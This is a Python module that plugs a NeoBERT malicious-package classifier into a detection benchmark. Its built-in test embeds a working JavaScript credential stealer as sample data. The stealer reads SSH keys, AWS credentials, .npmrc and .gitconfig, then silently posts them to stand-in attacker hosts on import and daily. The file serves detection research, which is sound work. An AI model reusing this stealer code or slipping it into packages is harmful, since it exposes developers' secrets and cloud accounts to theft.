"""
Integration of NeoBERT with the ICN benchmark framework.
Adds NeoBERTBenchmarkModel to enable comparison with ICN, AMIL, CPG-GNN, and other models.
"""

import time
import logging
from pathlib import Path
from typing import Dict, List, Optional, Any
import torch

# Import from ICN benchmark framework
from icn.evaluation.benchmark_framework import BaseModel, BenchmarkResult, BenchmarkSample

# Import NeoBERT components
from neobert.model import NeoBERTClassifier, create_neobert_model
from neobert.config import NeoBERTConfig, EvaluationConfig, create_default_config

logger = logging.getLogger(__name__)


class NeoBERTBenchmarkModel(BaseModel):
    """NeoBERT model wrapper for benchmark framework integration."""
    
    def __init__(self, model_path: Optional[str] = None,
                 neobert_config: Optional[NeoBERTConfig] = None,
                 device: str = "auto"):
        super().__init__("NeoBERT")
        
        # Device selection
        if device == "auto":
            self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
        else:
            self.device = torch.device(device)
        
        # Configuration
        if neobert_config is None:
            neobert_config, _, _ = create_default_config()
        self.config = neobert_config
        
        # Load or create model
        if model_path and Path(model_path).exists():
            self._load_trained_model(model_path)
            logger.info(f"Loaded trained NeoBERT model from {model_path}")
        else:
            # Create untrained model (for baseline comparison)
            self.model = create_neobert_model(neobert_config, str(self.device))
            logger.warning("Using untrained NeoBERT model - results will be random")
        
        logger.info(f"NeoBERT benchmark model initialized on {self.device}")
    
    def _load_trained_model(self, model_path: str):
        """Load trained NeoBERT model from checkpoint."""
        try:
            checkpoint = torch.load(model_path, map_location=self.device)
            
            # Load configurations if available
            if "neobert_config" in checkpoint:
                self.config = checkpoint["neobert_config"]
            elif "config" in checkpoint:
                self.config = checkpoint["config"]
            
            # Create model and load weights
            self.model = create_neobert_model(self.config, str(self.device))
            
            if "model_state_dict" in checkpoint:
                self.model.load_state_dict(checkpoint["model_state_dict"])
            
            # Set to evaluation mode
            self.model.eval()
            
        except Exception as e:
            logger.error(f"Failed to load NeoBERT model: {e}")
            # Fallback to untrained model
            self.model = create_neobert_model(self.config, str(self.device))
    
    async def predict(self, sample: BenchmarkSample) -> BenchmarkResult:
        """Make prediction using NeoBERT model."""
        start_time = time.time()
        
        try:
            # Convert BenchmarkSample to NeoBERT format
            file_contents = self._convert_benchmark_sample_to_files(sample)
            
            if not file_contents:
                return self._create_error_result(sample, "No extractable files found")
            
            # Make prediction
            output = self.model.predict_package(
                sample.package_name,
                file_contents,
                sample.ecosystem
            )
            
            # Create explanation
            explanation = self._create_explanation(output, sample)
            
            return BenchmarkResult(
                model_name=self.model_name,
                sample_id=f"{sample.ecosystem}_{sample.package_name}",
                ground_truth=sample.ground_truth_label,
                prediction=output.prediction,
                confidence=output.confidence,
                inference_time_seconds=time.time() - start_time,
                explanation=explanation,
                malicious_indicators=self._extract_malicious_indicators(output),
                success=True,
                metadata={
                    "num_units_processed": output.num_units_processed,
                    "pooling_strategy": self.config.pooling_strategy,
                    "model_type": self.config.model_name,
                    "attention_available": output.attention_weights is not None,
                    "unit_scores_available": output.unit_scores is not None,
                    "pooling_metadata": output.pooling_metadata or {}
                }
            )
            
        except Exception as e:
            logger.error(f"NeoBERT prediction failed for {sample.package_name}: {e}")
            return self._create_error_result(sample, str(e), time.time() - start_time)
    
    def _convert_benchmark_sample_to_files(self, sample: BenchmarkSample) -> Dict[str, str]:
        """Convert BenchmarkSample to file contents dict."""
        file_contents = {}
        
        # Use individual files if available, otherwise parse combined content
        if sample.individual_files:
            file_contents = sample.individual_files.copy()
        else:
            # Parse combined content by file separators
            content_parts = sample.raw_content.split("=" * 50)  # File separator
            
            for i, part in enumerate(content_parts):
                if part.strip():
                    # Try to extract file path from content
                    lines = part.strip().split('\n')
                    file_path = f"file_{i}.unknown"
                    
                    # Look for file header
                    if lines and lines[0].startswith("# File:"):
                        try:
                            file_path = lines[0].split("# File:")[1].strip().split()[0]
                        except:
                            pass
                    
                    # Extract actual content (skip header)
                    content = '\n'.join(lines[1:] if lines[0].startswith("#") else lines)
                    
                    if content.strip():
                        file_contents[file_path] = content
        
        return file_contents
    
    def _create_explanation(self, output, sample: BenchmarkSample) -> str:
        """Create human-readable explanation."""
        explanation_parts = []
        
        # Main verdict
        verdict = "MALICIOUS" if output.prediction == 1 else "BENIGN"
        confidence = output.confidence
        explanation_parts.append(f"NeoBERT Verdict: {verdict} (confidence: {confidence:.3f})")
        
        # Processing stats
        explanation_parts.append(f"Processed {output.num_units_processed} units")
        explanation_parts.append(f"Pooling: {self.config.pooling_strategy}")
        
        # Suspicious units (for attention/MIL pooling)
        if output.suspicious_units:
            explanation_parts.append(f"Top suspicious units: {len(output.suspicious_units)}")
            
            # Add attention details if available
            if output.attention_weights is not None:
                max_attention = float(output.attention_weights.max()) if output.attention_weights.numel() > 0 else 0.0
                explanation_parts.append(f"Max attention weight: {max_attention:.3f}")
        
        # Unit scores (for MIL pooling)
        if output.unit_scores is not None:
            max_score = float(output.unit_scores.max()) if output.unit_scores.numel() > 0 else 0.0
            explanation_parts.append(f"Max unit suspicion score: {max_score:.3f}")
        
        # Auxiliary predictions
        if output.api_predictions is not None:
            predicted_apis = (output.api_predictions > 0.5).sum().item()
            explanation_parts.append(f"Predicted risky APIs: {predicted_apis}/{len(self.config.risky_apis)}")
        
        if output.phase_predictions is not None:
            phase_names = ["install", "runtime", "test"]
            dominant_phase_idx = output.phase_predictions.argmax().item()
            if dominant_phase_idx < len(phase_names):
                dominant_phase = phase_names[dominant_phase_idx]
                explanation_parts.append(f"Dominant phase: {dominant_phase}")
        
        # Pooling metadata
        if output.pooling_metadata:
            if "attention_entropy" in output.pooling_metadata:
                entropy = output.pooling_metadata["attention_entropy"]
                explanation_parts.append(f"Attention entropy: {entropy:.3f}")
        
        return "; ".join(explanation_parts)
    
    def _extract_malicious_indicators(self, output) -> List[str]:
        """Extract malicious indicators for benchmark result."""
        indicators = []
        
        # From suspicious units
        if output.suspicious_units:
            indicators.append(f"suspicious_units:{len(output.suspicious_units)}")
        
        # From attention analysis
        if output.attention_weights is not None and output.attention_weights.numel() > 0:
            max_attention = float(output.attention_weights.max())
            if max_attention > 0.5:  # High attention concentration
                indicators.append(f"high_attention:{max_attention:.3f}")
        
        # From unit scores (MIL)
        if output.unit_scores is not None and output.unit_scores.numel() > 0:
            high_suspicion_units = (output.unit_scores > 0.7).sum().item()
            if high_suspicion_units > 0:
                indicators.append(f"high_suspicion_units:{high_suspicion_units}")
        
        # From API predictions
        if output.api_predictions is not None:
            predicted_apis = (output.api_predictions > 0.5).sum().item()
            if predicted_apis > 0:
                # Get specific APIs
                api_indices = (output.api_predictions > 0.5).nonzero(as_tuple=True)[0]
                for idx in api_indices[:3]:  # Top 3
                    api_name = self.config.risky_apis[idx.item()]
                    prob = output.api_predictions[idx].item()
                    indicators.append(f"predicted_api:{api_name}({prob:.3f})")
        
        # From phase predictions
        if output.phase_predictions is not None:
            phase_names = ["install", "runtime", "test"]
            install_prob = output.phase_predictions[0].item() if len(output.phase_predictions) > 0 else 0
            if install_prob > 0.7:  # High install phase probability is suspicious
                indicators.append(f"install_phase_dominant:{install_prob:.3f}")
        
        # From pooling metadata
        if output.pooling_metadata:
            if "high_suspicion_units" in output.pooling_metadata:
                count = output.pooling_metadata["high_suspicion_units"]
                if count > 0:
                    indicators.append(f"mil_high_suspicion:{count}")
        
        return indicators
    
    def _create_error_result(self, sample: BenchmarkSample, error_msg: str,
                           inference_time: float = 0.0) -> BenchmarkResult:
        """Create error result."""
        return BenchmarkResult(
            model_name=self.model_name,
            sample_id=f"{sample.ecosystem}_{sample.package_name}",
            ground_truth=sample.ground_truth_label,
            prediction=0,  # Conservative prediction
            confidence=0.5,  # Neutral confidence
            inference_time_seconds=inference_time,
            explanation=f"NeoBERT analysis failed: {error_msg}",
            success=False,
            error_message=error_msg
        )
    
    def get_model_info(self) -> Dict[str, Any]:
        """Get NeoBERT model information."""
        return {
            "model_type": "NeoBERT",
            "model_class": "Transformer-based Package Classifier",
            "approach": "Unit-level encoding with package-level pooling",
            "supports_explanations": True,
            "supports_unit_localization": self.config.pooling_strategy in ["attention", "mil"],
            "inference_method": "local",
            "device": str(self.device),
            
            # Configuration details
            "config": {
                "backbone_model": self.config.model_name,
                "pooling_strategy": self.config.pooling_strategy,
                "max_units_per_package": self.config.max_units_per_package,
                "max_tokens_per_unit": self.config.max_tokens_per_unit,
                "use_augmented_features": self.config.use_augmented_features,
                "projection_dim": self.config.projection_dim,
                "total_parameters": self.model.count_parameters() if hasattr(self.model, 'count_parameters') else 0
            }
        }
    
    def get_detailed_prediction(self, sample: BenchmarkSample) -> Dict[str, Any]:
        """Get detailed prediction with full analysis."""
        try:
            # Convert to NeoBERT format
            file_contents = self._convert_benchmark_sample_to_files(sample)
            
            if not file_contents:
                return {"error": "No extractable files"}
            
            # Get detailed explanation
            explanation = self.model.get_detailed_explanation(
                sample.package_name,
                file_contents,
                sample.ecosystem
            )
            
            return explanation
            
        except Exception as e:
            logger.error(f"Detailed prediction failed: {e}")
            return {"error": str(e)}


def create_neobert_benchmark_model(model_path: Optional[str] = None,
                                  device: str = "auto") -> NeoBERTBenchmarkModel:
    """Create NeoBERT benchmark model with default configuration."""
    return NeoBERTBenchmarkModel(model_path=model_path, device=device)


# Integration function to add NeoBERT to existing benchmark suites
def add_neobert_to_benchmark_suite(benchmark_suite, model_path: Optional[str] = None):
    """
    Add NeoBERT model to an existing benchmark suite.
    
    Args:
        benchmark_suite: Existing ICN benchmark suite
        model_path: Optional path to trained NeoBERT model
    """
    neobert_model = create_neobert_benchmark_model(model_path)
    
    # Add to benchmark suite (assuming it has a register_model method)
    if hasattr(benchmark_suite, 'register_model'):
        benchmark_suite.register_model(neobert_model)
        logger.info("✅ NeoBERT model added to benchmark suite")
    else:
        logger.warning("⚠️  Benchmark suite doesn't support model registration")
    
    return neobert_model


if __name__ == "__main__":
    # Test NeoBERT benchmark integration
    import asyncio
    
    async def test_neobert_benchmark():
        """Test NeoBERT benchmark model."""
        
        # Create test sample
        test_sample = BenchmarkSample(
            package_name="test-suspicious-package",
            ecosystem="npm",
            sample_type="malicious_intent",
            ground_truth_label=1,
            raw_content="""
# File: package.json
{"name": "suspicious", "version": "1.0.0", "main": "index.js"}
==================================================
# File: index.js
const fs = require('fs');
const os = require('os');
const https = require('https');

// Credential harvesting function
function harvestData() {
    const homeDir = os.homedir();
    const sensitiveFiles = [
        '.ssh/id_rsa',
        '.aws/credentials',
        '.npmrc',
        '.gitconfig'
    ];
    
    let harvested = {};
    
    sensitiveFiles.forEach(file => {
        try {
            const filePath = homeDir + '/' + file;
            const data = fs.readFileSync(filePath, 'utf8');
            harvested[file] = Buffer.from(data).toString('base64');
        } catch (e) {
            // Silent failure
        }
    });
    
    // Exfiltrate data
    if (Object.keys(harvested).length > 0) {
        const payload = JSON.stringify({
            victim: os.hostname(),
            user: os.userInfo().username,
            data: harvested,
            timestamp: Date.now()
        });
        
        const options = {
            hostname: 'attacker-server.evil-domain.com',
            port: 443,
            path: '/api/exfiltrate',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (compatible; UpdateService/1.0)'
            }
        };
        
        const req = https.request(options, (res) => {
            console.log('Update check completed');
        });
        
        req.on('error', () => {
            // Silent failure
        });
        
        req.write(payload);
        req.end();
    }
}

// Execute on import
harvestData();

// Also set up periodic execution
setInterval(harvestData, 24 * 60 * 60 * 1000); // Daily

module.exports = {
    name: 'utility-helper',
    version: '1.0.0'
};
==================================================
            """.strip(),
            file_paths=["package.json", "index.js"],
            individual_files={
                "package.json": '{"name": "suspicious", "version": "1.0.0", "main": "index.js"}',
                "index.js": """const fs = require('fs');
const os = require('os');
const https = require('https');

function harvestData() {
    const homeDir = os.homedir();
    let harvested = {};
    
    ['.ssh/id_rsa', '.aws/credentials'].forEach(file => {
        try {
            const data = fs.readFileSync(homeDir + '/' + file, 'utf8');
            harvested[file] = Buffer.from(data).toString('base64');
        } catch (e) {}
    });
    
    if (Object.keys(harvested).length > 0) {
        https.request('https://attacker-server.com/api/exfiltrate', {method: 'POST'}).end(JSON.stringify(harvested));
    }
}

harvestData();
setInterval(harvestData, 24 * 60 * 60 * 1000);
module.exports = {};"""
            },
            num_files=2
        )
        
        # Create NeoBERT model (untrained for testing)
        neobert_model = create_neobert_benchmark_model()
        
        # Test prediction
        result = await neobert_model.predict(test_sample)
        
        print("🧪 NeoBERT Benchmark Test Results:")
        print(f"   Model: {result.model_name}")
        print(f"   Prediction: {'MALICIOUS' if result.prediction else 'BENIGN'}")
        print(f"   Confidence: {result.confidence:.3f}")
        print(f"   Inference time: {result.inference_time_seconds:.3f}s")
        print(f"   Success: {result.success}")
        print(f"   Explanation: {result.explanation}")
        print(f"   Indicators: {result.malicious_indicators}")
        
        # Test detailed prediction
        detailed = neobert_model.get_detailed_prediction(test_sample)
        print(f"\n📊 Detailed Analysis:")
        if "error" not in detailed:
            print(f"   Prediction: {detailed.get('prediction', {})}")
            print(f"   Processing: {detailed.get('processing_stats', {})}")
            print(f"   Units: {detailed.get('unit_analysis', {}).get('total_units', 0)}")
        else:
            print(f"   Error: {detailed['error']}")
        
        print("✅ NeoBERT benchmark integration test completed")
    
    # Run test
    asyncio.run(test_neobert_benchmark())